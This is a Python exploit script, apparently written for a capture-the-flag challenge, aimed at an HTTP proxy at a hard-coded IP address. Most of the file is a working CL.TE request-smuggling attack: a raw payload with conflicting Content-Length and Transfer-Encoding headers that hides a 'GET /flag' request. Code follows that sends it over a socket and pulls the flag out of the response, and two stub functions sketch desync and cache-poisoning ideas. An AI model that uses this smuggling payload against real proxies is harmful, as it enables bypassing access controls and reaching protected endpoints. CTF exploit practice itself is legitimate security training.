#!/usr/bin/env python3
"""
Final exploit attempt for Poi CTF
Focusing on chunked encoding vulnerability
"""

import socket
import time

HOST = "210.79.190.102"
PORT = 8081

def analyze_proxy_behavior():
    """
    The proxy doesn't handle Transfer-Encoding: chunked
    - Request: Only checks Content-Length, ignores Transfer-Encoding
    - Response: If no Content-Length, reads until EOF (line by line)
    
    Vulnerability: If response is chunked, proxy reads chunked format as body
    """
    
    print("[*] Analyzing proxy behavior with chunked encoding...")
    
    # The key insight: The proxy doesn't parse chunked encoding
    # If we send Transfer-Encoding: chunked in request without Content-Length,
    # the proxy won't read the body at all (line 240 only checks Content-Length)
    # This means the chunked body stays in the connection buffer!
    
    # When the proxy forwards the request, the upstream will read the chunked body
    # But the proxy doesn't send it because it didn't read it!
    # This causes desynchronization!
    
    # Actually wait, the proxy forwards headers, then if Content-Length exists,
    # it reads and forwards the body. If not, it just forwards headers.
    # So if we send Transfer-Encoding: chunked without Content-Length,
    # the proxy forwards headers (including Transfer-Encoding) but no body.
    # The upstream expects chunked body, but gets nothing, so it might hang or error.
    
    # But what if we send BOTH Content-Length and Transfer-Encoding?
    # The proxy will use Content-Length to read the body
    # But the upstream might use Transfer-Encoding to parse it
    # This is CL.TE or TE.CL attack!
    
    print("[*] Attempting CL.TE attack (Content-Length vs Transfer-Encoding)...")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)
    
    try:
        sock.connect((HOST, PORT))
        
        # CL.TE: Send Content-Length that's smaller than actual chunked body
        # Proxy reads Content-Length bytes, but upstream parses as chunked
        # The remaining bytes become the next request!
        
        # Chunked format: "5\r\nhello\r\n0\r\n\r\n" = 17 bytes
        # But Content-Length says 5 bytes
        # Proxy reads 5 bytes: "5\r\nh"
        # Upstream parses chunked: reads "5\r\nhello\r\n0\r\n\r\n" (17 bytes)
        # Remaining 12 bytes become next request!
        
        # Let's smuggle a request to /flag
        # First, we need to login to get a session
        # Then smuggle GET /flag
        
        # Actually, we can't login without credentials
        # But maybe we can use the chunked encoding bug differently
        
        # Let's try: Send a request with chunked body that contains a smuggled request
        # The proxy reads Content-Length, but upstream parses chunked
        # The smuggled request gets executed!
        
        # Chunked body: "0\r\n\r\nGET /flag HTTP/1.1\r\nHost: localhost\r\n\r\n"
        # Content-Length: 4 (just "0\r\n")
        # Proxy reads 4 bytes, but upstream parses full chunked body
        
        smuggled = b"""POST /login HTTP/1.1\r
Host: localhost\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 4\r
Transfer-Encoding: chunked\r
\r
0\r
\r
GET /flag HTTP/1.1\r
Host: localhost\r
\r
"""
        
        print("[*] Sending CL.TE smuggled request...")
        print(f"[*] Request length: {len(smuggled)} bytes")
        sock.send(smuggled)
        
        # Wait a bit for response
        time.sleep(1)
        
        response = b""
        try:
            sock.settimeout(5)
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
                if len(response) > 50000:
                    break
        except socket.timeout:
            pass
        except:
            pass
        
        print(f"[+] Received {len(response)} bytes")
        if response:
            response_str = response.decode('utf-8', errors='ignore')
            print(f"[+] Response:\n{response_str[:2000]}")
            
            if "BPJS{" in response_str:
                flag_start = response_str.find("BPJS{")
                flag_end = response_str.find("}", flag_start) + 1
                flag = response_str[flag_start:flag_end]
                print(f"\n[+] FLAG FOUND: {flag}")
                return flag
        
        sock.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
    
    return None

def try_desync_attack():
    """
    Try to cause desynchronization by sending Transfer-Encoding without Content-Length
    """
    print("\n[*] Trying desynchronization attack...")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)
    
    try:
        sock.connect((HOST, PORT))
        
        # Send request with Transfer-Encoding but no Content-Length
        # Proxy won't read body, but upstream expects chunked body
        # This might cause desync
        
        # Actually, this won't work because the proxy forwards headers
        # and if there's no Content-Length, it doesn't forward body
        # So upstream gets headers but no body, which is wrong for chunked
        
        # Let's try a different approach: Send chunked body that the proxy misreads
        
        # The proxy reads line by line if no Content-Length
        # Chunked format: size\r\ndata\r\n
        # If we can make the proxy read this incorrectly...
        
        # Actually, I think the real exploit is in response handling, not request
        # If upstream sends chunked response, proxy reads it incorrectly
        
        # But how do we make upstream send chunked response?
        # Flask/nginx typically send Content-Length
        
        # Unless... we can use HTTP/1.1 features or force it somehow
        
        print("[*] This approach might not work...")
        sock.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")

def try_cache_poisoning():
    """
    Try to poison cache using chunked response
    """
    print("\n[*] Attempting cache poisoning...")
    
    # The /content endpoint can be cached
    # If we can make it return a chunked response, proxy will cache it incorrectly
    
    # But Flask/nginx send Content-Length, so this is hard
    
    print("[*] Need to find a way to get chunked response...")

if __name__ == "__main__":
    print("=" * 70)
    print("Final Exploit Attempt - Chunked Encoding")
    print("=" * 70)
    
    result = analyze_proxy_behavior()
    if not result:
        try_desync_attack()
        try_cache_poisoning()
    
    if result:
        print(f"\n[+] SUCCESS! Flag: {result}")
    else:
        print("\n[-] Need to investigate further...")
        print("[*] The vulnerability is in chunked encoding handling")
        print("[*] Proxy doesn't parse chunked format correctly")



